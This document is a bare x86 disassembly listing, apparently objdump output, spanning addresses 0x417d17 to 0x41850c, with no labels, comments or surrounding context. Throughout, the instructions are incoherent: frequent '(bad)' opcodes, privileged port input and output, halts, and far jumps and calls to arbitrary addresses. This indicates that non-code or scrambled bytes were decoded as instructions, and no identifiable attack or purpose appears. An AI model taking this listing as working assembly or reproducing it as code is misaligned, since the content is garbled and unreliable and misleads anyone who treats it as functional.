  417d17:	mov    dl,0xfe
  417d19:	jne    0x417cd8
  417d1b:	adc    edi,DWORD PTR [ecx+ebx*1+0x13493136]
  417d22:	inc    BYTE PTR [esi+0x78a29ab]
  417d28:	sahf   
  417d29:	mov    ch,0xf7
  417d2b:	sub    ebx,ecx
  417d2d:	rol    DWORD PTR [eax],1
  417d2f:	xchg   ebx,eax
  417d30:	std    
  417d31:	in     al,0x9e
  417d33:	and    BYTE PTR [edx+0x3f],dh
  417d36:	pop    ebx
  417d37:	add    ah,BYTE PTR [edx-0x3e]
  417d3a:	or     al,0x39
  417d3c:	lahf   
  417d3d:	(bad)  
  417d3e:	aad    0x3c
  417d40:	ja     0x417d9f
  417d42:	mov    ds:0x8060dabf,al
  417d47:	aam    0x66
  417d49:	push   cs
  417d4a:	sbb    eax,0xb3e0948f
  417d4f:	imul   ecx,DWORD PTR [ecx],0x7d
  417d52:	mov    ch,0x13
  417d54:	ret    
  417d55:	and    al,0x13
  417d57:	and    al,0xf6
  417d59:	mov    edx,0xc40c5bc9
  417d5e:	(bad)  
  417d5f:	aam    0x53
  417d61:	push   0xc46204cc
  417d66:	xlat   BYTE PTR ds:[ebx]
  417d67:	lock out 0xe,al
  417d6a:	lea    eax,[edi-0x7b]
  417d6d:	or     DWORD PTR [ebp-0x74c8fc79],0x49
  417d74:	mov    edx,DWORD PTR [ecx-0x6b]
  417d77:	xlat   BYTE PTR ds:[ebx]
  417d78:	xchg   BYTE PTR [ebp-0x5e249ed6],dh
  417d7e:	scas   eax,DWORD PTR es:[edi]
  417d7f:	nop
  417d80:	lods   al,BYTE PTR ds:[esi]
  417d81:	das    
  417d82:	iret   
  417d83:	fs es mov bl,0x6b
  417d87:	es fwait
  417d89:	or     edi,DWORD PTR [ecx+ecx*4+0x4f]
  417d8d:	enter  0xffba,0x70
  417d91:	sbb    esi,DWORD PTR [eax]
  417d93:	xor    BYTE PTR [ecx],cl
  417d95:	ret    
  417d96:	xchg   esi,eax
  417d97:	shl    eax,0xcb
  417d9a:	xor    DWORD PTR [eax],ebx
  417d9c:	sahf   
  417d9d:	es push esi
  417d9f:	push   edx
  417da0:	pusha  
  417da1:	push   ebx
  417da2:	iret   
  417da3:	nop    esp
  417da6:	xor    al,0xda
  417da8:	loope  0x417df7
  417daa:	les    ebp,FWORD PTR [ebx+0x752dbaa5]
  417db0:	repnz mov cl,0x9a
  417db3:	mov    ch,0xb3
  417db5:	sub    al,0x2f
  417db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417db8:	fcom   DWORD PTR [edx]
  417dba:	jle    0x417d68
  417dbc:	cmp    ch,dh
  417dbe:	out    dx,eax
  417dbf:	xor    eax,0x20a59fa5
  417dc4:	and    edx,DWORD PTR [esi+0x1c1902fc]
  417dca:	xchg   ebp,eax
  417dcb:	fwait
  417dcc:	sbb    esi,DWORD PTR [ecx]
  417dce:	loop   0x417d88
  417dd0:	(bad)  
  417dd1:	hlt    
  417dd2:	jg     0x417da8
  417dd4:	cld    
  417dd5:	lds    edx,FWORD PTR [ebp+0x7]
  417dd8:	or     eax,0xbf25ad3e
  417ddd:	cwde   
  417dde:	cli    
  417ddf:	jmp    0x50b77d74
  417de4:	add    edx,DWORD PTR [edi]
  417de6:	xchg   esp,eax
  417de7:	push   0x1f
  417de9:	fldenv [ebx]
  417deb:	jmp    FWORD PTR [edi+0x7d]
  417dee:	mov    eax,esi
  417df0:	mov    dh,0xa
  417df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417df3:	scas   al,BYTE PTR es:[edi]
  417df4:	test   al,0xf7
  417df6:	mov    dl,0xef
  417df8:	js     0x417e52
  417dfa:	popa   
  417dfb:	xlat   BYTE PTR ds:[ebx]
  417dfc:	and    esp,DWORD PTR [eax-0x4b]
  417dff:	pop    ebp
  417e00:	jecxz  0x417da5
  417e02:	jp     0x417e4f
  417e04:	sti    
  417e05:	push   edi
  417e06:	xor    BYTE PTR es:[ecx],al
  417e09:	xchg   ebp,eax
  417e0a:	pop    ecx
  417e0b:	push   ss
  417e0c:	adc    edi,DWORD PTR [esi]
  417e0e:	ret    0x3f22
  417e11:	dec    ecx
  417e12:	mov    ds:0xf92a908d,al
  417e17:	hlt    
  417e18:	sete   BYTE PTR [eax+0x72c26d03]
  417e1f:	pusha  
  417e20:	fsub   QWORD PTR ds:0x3e8e2093
  417e26:	js     0x417e86
  417e28:	pop    ebp
  417e29:	dec    ebx
  417e2a:	dec    edi
  417e2b:	xlat   BYTE PTR ds:[ebx]
  417e2c:	rol    BYTE PTR [eax],0xa1
  417e2f:	mov    BYTE PTR [ebp-0x7],dh
  417e32:	test   bl,ah
  417e34:	mov    DWORD PTR [esi],ecx
  417e36:	adc    BYTE PTR [edx+0x31],0x6
  417e3a:	cmp    esp,esi
  417e3c:	retf   
  417e3d:	adc    edi,0x973fcb79
  417e43:	xchg   ecx,eax
  417e44:	dec    ebp
  417e45:	mov    ecx,0x26c0eff5
  417e4a:	fimul  DWORD PTR [ecx-0x43da15ac]
  417e50:	jo     0x417df2
  417e52:	add    BYTE PTR [edx-0x29a509cd],ah
  417e58:	jmp    0x2a3f:0x7a7f9ff4
  417e5f:	adc    DWORD PTR [ebp-0x61b5dcff],0x20795f3d
  417e69:	into   
  417e6a:	mov    ch,0x57
  417e6c:	mov    ebp,0xe50d4437
  417e71:	lahf   
  417e72:	retf   
  417e73:	ins    DWORD PTR es:[edi],dx
  417e74:	lds    ebp,FWORD PTR [ecx]
  417e76:	in     eax,dx
  417e77:	push   ss
  417e78:	lds    esi,FWORD PTR [ebp-0x5c77836d]
  417e7e:	shl    DWORD PTR ds:0x4a258b87,1
  417e84:	xchg   edi,eax
  417e85:	dec    ebx
  417e86:	cmp    BYTE PTR [ecx-0x5d227534],al
  417e8c:	jnp    0x417e95
  417e8e:	cwde   
  417e8f:	stos   DWORD PTR es:[edi],eax
  417e90:	cmp    bl,0x15
  417e93:	and    BYTE PTR [ebp+0x45063f05],ah
  417e99:	mov    dl,0x52
  417e9b:	hlt    
  417e9c:	fs cs or ah,bh
  417ea0:	ss loop 0x417ebb
  417ea3:	sub    ebx,DWORD PTR [ebx]
  417ea5:	mov    BYTE PTR [esi-0x43],dh
  417ea8:	sub    al,0xbf
  417eaa:	gs daa 
  417eac:	daa    
  417ead:	sub    edx,DWORD PTR [esi-0x57506b31]
  417eb3:	icebp  
  417eb4:	mov    dh,0x4f
  417eb6:	add    al,0x8
  417eb8:	sub    al,0x90
  417eba:	sbb    dl,BYTE PTR [esi]
  417ebc:	in     al,0xd8
  417ebe:	nop
  417ebf:	pusha  
  417ec0:	leave  
  417ec1:	add    DWORD PTR [ebx-0x701178],ebx
  417ec7:	sub    DWORD PTR [edx-0x3333ddb5],eax
  417ecd:	dec    ebx
  417ece:	pop    ebx
  417ecf:	add    edx,DWORD PTR [esi]
  417ed1:	cmp    DWORD PTR [ecx+0x7],esp
  417ed4:	ret    0x740b
  417ed7:	jmp    0x23131ae
  417edc:	outs   dx,BYTE PTR ds:[esi]
  417edd:	or     eax,0x798f893f
  417ee2:	fs mov ah,0x34
  417ee5:	xor    dl,ah
  417ee7:	push   es
  417ee8:	cmp    al,0x81
  417eea:	imul   ecx,DWORD PTR [ecx-0x401e2537],0x7a
  417ef1:	outs   dx,BYTE PTR ds:[esi]
  417ef2:	hlt    
  417ef3:	mov    al,ds:0xa8281bb8
  417ef8:	sub    edi,edi
  417efa:	std    
  417efb:	jns    0x417f26
  417efd:	xchg   edx,eax
  417efe:	push   cs
  417eff:	cwde   
  417f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f01:	mov    eax,ds:0xe91f2f6f
  417f06:	jmp    0x5d87f1c4
  417f0b:	mov    al,ds:0x50c3d691
  417f10:	ror    cl,0x93
  417f13:	not    ah
  417f15:	push   0xffffff8a
  417f17:	push   0x7d
  417f19:	push   edi
  417f1a:	sti    
  417f1b:	es pop ebp
  417f1d:	into   
  417f1e:	push   esi
  417f1f:	push   ss
  417f20:	in     al,dx
  417f21:	xchg   ebp,eax
  417f22:	jle    0x417ec6
  417f24:	sub    eax,0xb0c0a991
  417f29:	fisubr WORD PTR [esi+0x6d836ce6]
  417f2f:	and    al,0xf9
  417f31:	xchg   BYTE PTR [ebx+0x1548021a],dl
  417f37:	test   al,0x80
  417f39:	rcr    BYTE PTR [ebx-0x1796d99c],cl
  417f3f:	gs jns 0x417fab
  417f42:	push   edx
  417f43:	jmp    0xf93f6b02
  417f48:	lea    ecx,[edx+0x1a]
  417f4b:	je     0x417f34
  417f4d:	pop    eax
  417f4e:	out    dx,al
  417f4f:	adc    al,BYTE PTR [edi-0x61]
  417f52:	pop    edx
  417f53:	jl     0x417fa4
  417f55:	xor    BYTE PTR [ebp+0x3b62be28],ch
  417f5b:	stc    
  417f5c:	sub    edi,0xc16d63a6
  417f62:	mov    DWORD PTR [eax-0x61d4f507],esi
  417f68:	ret    
  417f69:	mov    esp,DWORD PTR [eax]
  417f6b:	hlt    
  417f6c:	outs   dx,BYTE PTR ds:[esi]
  417f6d:	dec    edi
  417f6e:	cli    
  417f6f:	adc    esp,ecx
  417f71:	mov    esp,0xf0b35807
  417f76:	repnz xor BYTE PTR [esi+0x78],ah
  417f7a:	repnz push ds
  417f7c:	hlt    
  417f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f7e:	scas   eax,DWORD PTR es:[edi]
  417f7f:	mov    ebp,0x1aa660ee
  417f84:	test   DWORD PTR [eax+edi*8-0x22],esp
  417f88:	call   0xba3f2c6b
  417f8d:	jmp    0x417f1b
  417f8f:	add    edx,DWORD PTR [esi+0x52341d91]
  417f95:	call   0xd93678a0
  417f9a:	jmp    0x853c:0x44214c2c
  417fa1:	mov    ch,al
  417fa3:	sbb    esp,DWORD PTR [esp+ebp*8+0x1d3f3243]
  417faa:	dec    ebx
  417fab:	xor    BYTE PTR [ebx-0x2c],bl
  417fae:	test   DWORD PTR [ebp+eiz*4-0x73],ebx
  417fb2:	rol    eax,cl
  417fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb5:	adc    ah,BYTE PTR [eax+esi*1-0x6ee4021a]
  417fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fbd:	push   ds
  417fbe:	mov    bl,0x7e
  417fc0:	fistp  DWORD PTR [esi-0x27]
  417fc3:	mov    ecx,0x4de7c221
  417fc8:	xchg   DWORD PTR [ecx],eax
  417fca:	in     eax,0x85
  417fcc:	test   ah,bh
  417fce:	push   ecx
  417fcf:	stos   DWORD PTR es:[edi],eax
  417fd0:	gs xchg edi,eax
  417fd2:	pushf  
  417fd3:	xchg   DWORD PTR [eax+0x43],edi
  417fd6:	add    bh,ah
  417fd8:	add    ecx,0x61
  417fdb:	jb     0x417f72
  417fdd:	lds    esp,FWORD PTR [ecx+0x54]
  417fe0:	xchg   esp,eax
  417fe1:	popa   
  417fe2:	in     al,dx
  417fe3:	scas   al,BYTE PTR es:[edi]
  417fe4:	jg     0x417fd2
  417fe6:	and    edx,DWORD PTR ds:0x51b663ab
  417fec:	xchg   edi,eax
  417fed:	rcr    DWORD PTR ds:0x942905ab,1
  417ff3:	add    BYTE PTR [eax],bl
  417ff5:	xor    eax,0x68f48f69
  417ffa:	adc    al,0x6a
  417ffd:	mov    bh,0xa9
  417fff:	add    dh,al
  418001:	mov    ch,0x1d
  418003:	je     0x417fc5
  418005:	fadd   DWORD PTR [esi+0x5b]
  418008:	add    al,0x8c
  41800a:	xchg   esp,eax
  41800b:	xchg   esi,eax
  41800c:	clc    
  41800d:	xchg   edi,eax
  41800e:	jmp    0x417fad
  418010:	and    BYTE PTR [ecx+0x11],bh
  418013:	push   esi
  418014:	sub    al,0x9
  418016:	dec    edi
  418017:	pop    esp
  418018:	xor    DWORD PTR [esp+ebx*8+0x68],0xd1a7a606
  418020:	inc    eax
  418021:	pushf  
  418022:	in     al,0x72
  418024:	push   edi
  418025:	leave  
  418026:	mov    ebx,0xa1f6f49e
  41802b:	sub    BYTE PTR [ebp-0x54cdbccb],ah
  418031:	nop
  418032:	aaa    
  418033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418034:	pop    edx
  418035:	sar    BYTE PTR [eax+0x4f],1
  418038:	xchg   ebx,eax
  418039:	sub    DWORD PTR [esi],0xffffffa8
  41803c:	mov    eax,ds:0xf58cfc33
  418041:	mov    dh,0xbb
  418043:	sbb    eax,0x9d807cc0
  418048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418049:	sub    BYTE PTR [esi-0x7d1a309e],al
  41804f:	cli    
  418050:	add    DWORD PTR [esi+0x7],edx
  418053:	jb     0x418046
  418055:	mov    edx,0x81bf1999
  41805a:	movq   mm5,mm3
  41805d:	fs sti 
  41805f:	pop    ss
  418060:	outs   dx,BYTE PTR ds:[esi]
  418061:	fisttp QWORD PTR [ebp+0x3f]
  418064:	dec    ecx
  418065:	loop   0x418042
  418067:	jecxz  0x4180d2
  418069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41806a:	add    DWORD PTR [esi-0x55879163],edi
  418070:	fcmovne st,st(4)
  418072:	stc    
  418073:	jbe    0x418001
  418075:	cmp    BYTE PTR [edi+ebp*2],dh
  418078:	xor    BYTE PTR [ebx-0x156a83c6],bl
  41807e:	xor    DWORD PTR [ebp-0x42bc9750],0xe024add9
  418088:	dec    ecx
  418089:	into   
  41808a:	push   eax
  41808b:	mov    ah,0x8
  41808d:	gs out 0x37,al
  418090:	inc    edi
  418091:	(bad)  [esi+0x3f646107]
  418097:	mov    edx,0xc1982293
  41809c:	out    dx,eax
  41809d:	aaa    
  41809e:	popa   
  41809f:	add    BYTE PTR [ebp-0x4bd227a8],ch
  4180a5:	adc    DWORD PTR [ebx+0x4b],esp
  4180a8:	mov    esp,0xca0c4be5
  4180ad:	mov    dh,0xd5
  4180af:	sbb    eax,0xb06ff23e
  4180b4:	mov    DWORD PTR [si-0x68a9],esp
  4180b9:	cld    
  4180ba:	mov    edi,0x6dcc0c4c
  4180bf:	fcom   DWORD PTR ds:0x454fa8b
  4180c5:	daa    
  4180c6:	xchg   edx,ecx
  4180c8:	jnp    0x418144
  4180ca:	addr16 and eax,esp
  4180cd:	fisub  DWORD PTR [esi]
  4180cf:	sub    al,0x8d
  4180d1:	xchg   edi,eax
  4180d2:	pop    ecx
  4180d3:	lock add eax,0x9e0dd514
  4180d9:	fdiv   QWORD PTR [edi-0x7e]
  4180dc:	mov    DWORD PTR [edi],edi
  4180de:	or     eax,0xcfcd2f4f
  4180e3:	out    0x81,eax
  4180e5:	add    al,0x86
  4180e7:	imul   BYTE PTR [ecx]
  4180e9:	sbb    BYTE PTR [ecx+ecx*4+0x80eed65],ah
  4180f0:	mul    DWORD PTR [eax]
  4180f2:	pop    ss
  4180f3:	pop    esi
  4180f4:	loopne 0x4180e2
  4180f6:	enter  0xaf8,0xf4
  4180fa:	jb     0x418161
  4180fc:	(bad)  
  4180fd:	in     eax,dx
  4180fe:	sbb    BYTE PTR fs:[eax],bh
  418101:	aam    0x35
  418103:	loope  0x418136
  418105:	mov    cl,0xf3
  418107:	mov    dl,0xa3
  418109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41810a:	je     0x4180e7
  41810c:	dec    edx
  41810d:	xchg   sp,ax
  41810f:	mov    ecx,ecx
  418111:	test   al,0x17
  418113:	adc    DWORD PTR [eax],0x28371808
  418119:	push   0xffffff91
  41811b:	and    esi,esi
  41811d:	mov    ch,0x31
  41811f:	push   ss
  418120:	into   
  418121:	mov    ah,0xdc
  418123:	lods   al,BYTE PTR ds:[esi]
  418124:	and    al,BYTE PTR ds:0x75856b8f
  41812a:	inc    ebp
  41812b:	das    
  41812c:	fidivr DWORD PTR [ebx-0x17]
  41812f:	mul    BYTE PTR [edi-0x6bb16ae4]
  418135:	add    BYTE PTR [esi-0xc],bl
  418138:	aam    0x3
  41813a:	xchg   DWORD PTR [edi+0x58],edx
  41813d:	stos   BYTE PTR es:[edi],al
  41813e:	xor    eax,0xdd5bf6d6
  418143:	jno    0x418153
  418145:	lock mov ds,WORD PTR [edi+eax*1]
  418149:	add    al,bl
  41814b:	and    BYTE PTR [edx+0x3ba27d49],ch
  418151:	cmc    
  418152:	mov    esi,0x1336fe3e
  418157:	dec    ebx
  418158:	das    
  418159:	loop   0x418157
  41815b:	cmp    dl,BYTE PTR ds:0xd316f12d
  418161:	test   al,0xde
  418163:	pushf  
  418164:	pop    ebp
  418165:	adc    esp,DWORD PTR [edi+0x5a1e20be]
  41816b:	fcom   DWORD PTR [edi-0x43c75614]
  418171:	inc    eax
  418172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418173:	cld    
  418174:	mov    esp,0x16944c47
  418179:	sbb    BYTE PTR [ebx+eiz*8+0x39],dl
  41817d:	popa   
  41817e:	xchg   ebp,eax
  41817f:	in     eax,0x56
  418181:	in     eax,dx
  418182:	adc    esi,esp
  418184:	and    ah,BYTE PTR [eax+0x26d9b300]
  41818a:	ror    BYTE PTR [esp+edx*8+0x4d],cl
  41818e:	popa   
  41818f:	xchg   ebx,eax
  418190:	mov    ebx,0xc1959b24
  418195:	loopne 0x418183
  418197:	sbb    al,0x50
  418199:	ror    DWORD PTR [esi+0x62bc6b61],1
  41819f:	xchg   esi,eax
  4181a0:	mov    ecx,0x34d4bf63
  4181a5:	mov    ah,0x1d
  4181a7:	sub    al,0xd
  4181a9:	push   es
  4181aa:	mov    bl,0x9b
  4181ac:	jmp    0x41814b
  4181ae:	fisub  WORD PTR [ebx-0x2701db68]
  4181b4:	dec    ecx
  4181b5:	int3   
  4181b6:	fs jne 0x41816c
  4181b9:	retf   0xf9a5
  4181bc:	sbb    BYTE PTR [edi-0x46],bl
  4181bf:	aaa    
  4181c0:	or     cl,BYTE PTR [ecx-0x5e1bfb80]
  4181c6:	inc    eax
  4181c7:	rcl    DWORD PTR [ecx+edx*4],1
  4181ca:	xlat   BYTE PTR ds:[ebx]
  4181cb:	cmp    BYTE PTR [esi],bl
  4181cd:	cmc    
  4181ce:	sbb    ebp,esp
  4181d0:	inc    ebx
  4181d1:	popf   
  4181d2:	add    ebp,DWORD PTR [esi+0x16bb8d66]
  4181d8:	ins    DWORD PTR es:[edi],dx
  4181d9:	(bad)
  4181de:	imul   esi,DWORD PTR [ebx+0x4b900276],0x32b7db89
  4181e8:	not    DWORD PTR [eax+0x20]
  4181eb:	inc    ebx
  4181ec:	pop    esi
  4181ed:	daa    
  4181ee:	pushf  
  4181ef:	or     eax,0x75a8ca5e
  4181f4:	dec    esi
  4181f5:	mov    dh,0xed
  4181f7:	sbb    eax,0x479cc995
  4181fc:	push   ebx
  4181fd:	cmp    BYTE PTR [ebx+0x3f],0x55
  418201:	adc    ah,bl
  418203:	std    
  418204:	mov    edi,esp
  418206:	jl     0x4181e6
  418208:	outs   dx,DWORD PTR ds:[esi]
  418209:	clc    
  41820a:	push   eax
  41820b:	cmp    al,0x64
  41820d:	gs mov edi,0xd13d7b06
  418213:	xchg   edi,eax
  418214:	jo     0x41819d
  418216:	lea    ebp,[edi+edi*2-0x80]
  41821a:	pop    esi
  41821b:	add    ebx,esp
  41821d:	es cli 
  41821f:	pop    ds
  418220:	mov    esp,0x78a2ecd
  418225:	popf   
  418226:	call   0xa768:0x7257e6b1
  41822d:	dec    esi
  41822e:	imul   BYTE PTR [esi+edi*1+0x2017ae12]
  418235:	out    dx,eax
  418236:	sbb    al,0x75
  418238:	retf   0xb246
  41823b:	call   0x2389:0x5b295ed4
  418242:	fst    QWORD PTR [ecx+0x3c]
  418245:	sub    al,0x48
  418247:	mov    dl,0x88
  418249:	cmp    bh,BYTE PTR [ecx-0x761c253a]
  41824f:	add    bl,dl
  418251:	ret    
  418252:	jecxz  0x4181d5
  418254:	xchg   BYTE PTR ds:0x17137a84,bl
  41825a:	retfw  0xbd8c
  41825e:	pop    ecx
  41825f:	mov    al,0x30
  418261:	mov    edi,0x8c9d91f6
  418266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418267:	dec    ebx
  418268:	out    0x41,eax
  41826a:	adc    BYTE PTR [edi+0x75],bh
  41826d:	ja     0x4182ea
  41826f:	mov    bh,0x73
  418271:	aas    
  418272:	inc    ebx
  418273:	pop    ecx
  418274:	jecxz  0x418229
  418276:	push   ds
  418277:	dec    edx
  418278:	and    DWORD PTR [edi-0x40],esi
  41827b:	pop    esi
  41827c:	cmp    esp,DWORD PTR [ebp+0x7b]
  41827f:	js     0x418299
  418281:	mov    bl,0xa8
  418283:	loopne 0x418303
  418285:	cmc    
  418286:	pop    ds
  418287:	inc    ebx
  418288:	cmp    dl,0x90
  41828b:	outs   dx,BYTE PTR ds:[esi]
  41828c:	pop    esi
  41828d:	lahf   
  41828e:	and    DWORD PTR [ecx+0x7516f0ff],ebp
  418294:	in     al,0x35
  418296:	jg     0x418291
  418298:	rol    bh,cl
  41829a:	mov    esi,DWORD PTR [eax+0x15]
  41829d:	inc    ebx
  41829e:	aaa    
  41829f:	add    BYTE PTR [ebx],0xf6
  4182a2:	aam    0x7c
  4182a4:	jns    0x4182e4
  4182a6:	inc    ebx
  4182a7:	mov    dl,0x57
  4182a9:	mov    cl,0x63
  4182ab:	aad    0x6
  4182ad:	iret   
  4182ae:	cwde   
  4182af:	mov    ah,0xae
  4182b1:	stos   BYTE PTR es:[edi],al
  4182b2:	mov    edi,0xb777e7d1
  4182b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182b8:	adc    edx,esp
  4182ba:	sbb    ebx,DWORD PTR ds:0x3f0c25c6
  4182c0:	xchg   ebp,eax
  4182c1:	stos   BYTE PTR es:[edi],al
  4182c2:	pushf  
  4182c3:	das    
  4182c4:	pop    ebx
  4182c5:	jecxz  0x418272
  4182c7:	pop    ss
  4182c8:	imul   eax,DWORD PTR [edx],0xa7261533
  4182ce:	call   0xd5ee8c69
  4182d3:	iret   
  4182d4:	adc    esi,esi
  4182d6:	dec    ecx
  4182d7:	imul   edi,DWORD PTR [esi+0x2a],0xffffff8a
  4182db:	out    0xe7,eax
  4182dd:	adc    eax,0x79f797bf
  4182e2:	sub    eax,0x310a95fc
  4182e7:	pop    ebp
  4182e8:	(bad)  
  4182ea:	mov    cl,bh
  4182ec:	adc    BYTE PTR [ebp+0x4aedd5e5],bh
  4182f2:	std    
  4182f3:	mov    esi,0x3f6e4d95
  4182f8:	or     al,0x70
  4182fa:	jo     0x41836a
  4182fc:	inc    ecx
  4182fd:	sbb    al,dl
  4182ff:	repnz push eax
  418301:	sbb    DWORD PTR [eax-0x25],edx
  418304:	sti    
  418305:	out    dx,al
  418306:	jecxz  0x418370
  418308:	mov    ds:0x72e33211,eax
  41830d:	xchg   ebx,eax
  41830e:	fdivr  DWORD PTR [esi+0x7b]
  418311:	adc    eax,0x4d86f9e4
  418316:	mov    cl,0xaf
  418318:	jge    0x41834b
  41831a:	retf   0x2c92
  41831d:	pushf  
  41831e:	js     0x418380
  418320:	loope  0x4182a7
  418322:	xchg   ebx,eax
  418323:	or     BYTE PTR [esi+0x4f512ed0],dl
  418329:	pop    es
  41832a:	cwde   
  41832b:	loope  0x4182fa
  41832d:	sbb    dh,BYTE PTR [ebp-0x19]
  418330:	test   eax,0xde75f175
  418335:	leave  
  418336:	sub    eax,0x2296b925
  41833b:	call   0x478b:0x5d3bc74
  418342:	cmp    DWORD PTR [edi+ebx*8+0x63],edi
  418346:	xlat   BYTE PTR ds:[ebx]
  418347:	xlat   BYTE PTR ds:[ebx]
  418348:	test   al,0xdb
  41834a:	lahf   
  41834b:	adc    eax,0x5b69f17d
  418350:	inc    esi
  418351:	adc    BYTE PTR [ecx-0x6df07944],ch
  418357:	arpl   bx,cx
  418359:	leave  
  41835a:	jns    0x418302
  41835c:	sti    
  41835d:	dec    edx
  41835e:	cld    
  41835f:	popa   
  418360:	popf   
  418361:	mov    cl,bh
  418363:	out    dx,al
  418364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418365:	repnz dec eax
  418367:	and    eax,0xf82c11a0
  41836c:	mov    ebx,0xcfffea38
  418371:	jnp    0x418378
  418373:	mov    ecx,0xd12caec9
  418378:	stos   BYTE PTR es:[edi],al
  418379:	mov    al,ds:0x9e0b903d
  41837e:	adc    esp,DWORD PTR [ebx+esi*4+0x70]
  418382:	sub    ch,ch
  418384:	out    0x11,eax
  418386:	iret   
  418387:	call   0x27d19bc8
  41838c:	ja     0x418356
  41838e:	mov    ecx,0x7bfc5fb7
  418393:	sub    DWORD PTR [edi+esi*8],edi
  418396:	aas    
  418397:	jp     0x418388
  418399:	repz mov edi,0x702450a8
  41839f:	xchg   ebx,eax
  4183a0:	lock add al,0x9
  4183a4:	push   edi
  4183a5:	and    BYTE PTR [ebx+0x4a],al
  4183a8:	inc    esp
  4183a9:	pop    es
  4183aa:	pop    DWORD PTR es:[esi+0x67]
  4183ae:	dec    edx
  4183af:	loope  0x4183ea
  4183b1:	mov    eax,ds:0xf4e164b1
  4183b6:	add    DWORD PTR cs:[ecx-0x20],ebx
  4183ba:	or     bh,BYTE PTR [eax+edx*1+0x19]
  4183be:	mov    edx,0xd21462c7
  4183c3:	lahf   
  4183c4:	or     ebp,DWORD PTR [eax+0x13]
  4183c7:	push   es
  4183c8:	scas   eax,DWORD PTR es:[edi]
  4183c9:	mov    ebp,fs
  4183cb:	xchg   edx,eax
  4183cc:	mov    fs,WORD PTR [eax]
  4183ce:	mov    cl,0xe7
  4183d0:	mov    al,0x2e
  4183d2:	(bad)  
  4183d3:	imul   dl
  4183d5:	out    0x8a,al
  4183d7:	adc    ah,BYTE PTR [eax+edi*2-0x10]
  4183db:	dec    ebx
  4183dc:	arpl   WORD PTR [esi],bp
  4183de:	xor    al,0x89
  4183e0:	xchg   dh,ah
  4183e2:	pop    ecx
  4183e3:	push   edx
  4183e4:	jg     0x418442
  4183e6:	jbe    0x41836b
  4183e8:	addr16 mov ebp,0x84f2ae4e
  4183ee:	dec    edx
  4183ef:	iret   
  4183f0:	inc    esp
  4183f1:	jl     0x4183fa
  4183f3:	add    eax,0x1969ec0d
  4183f8:	or     eax,0x61275b0a
  4183fd:	cmp    al,0x4d
  4183ff:	push   0x7237c915
  418404:	call   0xa01b:0xd076d744
  41840b:	mov    eax,DWORD PTR [eax-0x1f]
  41840e:	cli    
  41840f:	sbb    eax,0xb9ca08b8
  418414:	mov    ds:0x9573ebd1,al
  418419:	out    0xc9,al
  41841b:	sub    edi,edx
  41841d:	xor    bl,BYTE PTR [eax]
  41841f:	sbb    ah,0x12
  418422:	pop    esi
  418423:	(bad)  
  418424:	push   eax
  418425:	adc    eax,0x8b72545e
  41842a:	lock mov DWORD PTR [eax],ebp
  41842d:	jg     0x418469
  41842f:	in     al,0x21
  418431:	pop    ds
  418432:	nop
  418433:	cmp    ecx,edx
  418435:	xchg   ebp,eax
  418436:	outs   dx,WORD PTR ds:[esi]
  418438:	dec    edx
  418439:	jp     0x4184b6
  41843b:	popf   
  41843c:	push   ebx
  41843d:	or     dl,BYTE PTR ds:0xcdf8f1f
  418443:	(bad)  
  418444:	mov    cl,0x75
  418446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418447:	nop
  418448:	iret   
  418449:	mov    ds:0x14093f7b,eax
  41844e:	je     0x4183f4
  418450:	or     BYTE PTR [esi],0x2c
  418453:	cwde   
  418454:	fsub   DWORD PTR [eax-0x61027de7]
  41845a:	cmp    ch,BYTE PTR [ebx]
  41845c:	cmc    
  41845d:	push   ebx
  41845e:	neg    DWORD PTR [edi]
  418460:	fdiv   QWORD PTR [ebp+0x1d]
  418463:	adc    eax,DWORD PTR [ebx+0x2c16d15e]
  418469:	mov    al,ds:0x489ca95a
  41846e:	jb     0x41848c
  418470:	mov    esi,0x7e528ac2
  418475:	pop    edx
  418476:	adc    DWORD PTR [edi-0x22c278a4],0x7590a97c
  418480:	cld    
  418481:	ins    BYTE PTR es:[edi],dx
  418482:	stc    
  418483:	in     eax,0x3a
  418485:	sub    al,BYTE PTR [ebx-0x15]
  418488:	or     eax,0xd343056b
  41848d:	scas   eax,DWORD PTR es:[edi]
  41848e:	les    ebp,FWORD PTR [ebp-0x68]
  418491:	jmp    0x2bcc:0xf2903a8a
  418498:	js     0x4184b3
  41849a:	call   0x8a15a5a
  41849f:	ret    0x545e
  4184a2:	jo     0x4184ea
  4184a4:	mov    ebx,DWORD PTR ds:0xfede4724
  4184aa:	jle    0x4184fe
  4184ac:	jge    0x41849c
  4184ae:	fst    QWORD PTR [ebp-0x618e9c31]
  4184b4:	or     al,0x20
  4184b6:	sub    eax,0xbfe82b46
  4184bb:	push   esp
  4184bc:	adc    al,0xa4
  4184bf:	mov    ebx,0x3b85ecf4
  4184c4:	fisubr WORD PTR [edi-0x1fadd384]
  4184ca:	cmp    BYTE PTR [esi-0x3e56451b],0x82
  4184d1:	int    0xfe
  4184d3:	iret   
  4184d4:	das    
  4184d5:	sub    DWORD PTR [edi+0xf],eax
  4184d8:	dec    ebp
  4184d9:	mov    dl,0x88
  4184db:	jb     0x41854f
  4184dd:	mov    al,0xb2
  4184df:	enter  0x8095,0x7f
  4184e3:	inc    ecx
  4184e4:	mov    eax,ds:0x485bf66f
  4184e9:	lea    edi,es:[edi-0x7]
  4184ed:	cs push 0x74
  4184f0:	or     BYTE PTR [esi],dh
  4184f2:	sbb    eax,DWORD PTR ds:0x942640d1
  4184f8:	mov    ebp,0x26da3b3d
  4184fd:	aas    
  4184fe:	nop
  4184ff:	call   0x65c90bcf
  418504:	out    0xe8,al
  418506:	pop    ecx
  418507:	mov    esp,0x87957e4a
  41850c:	cli    
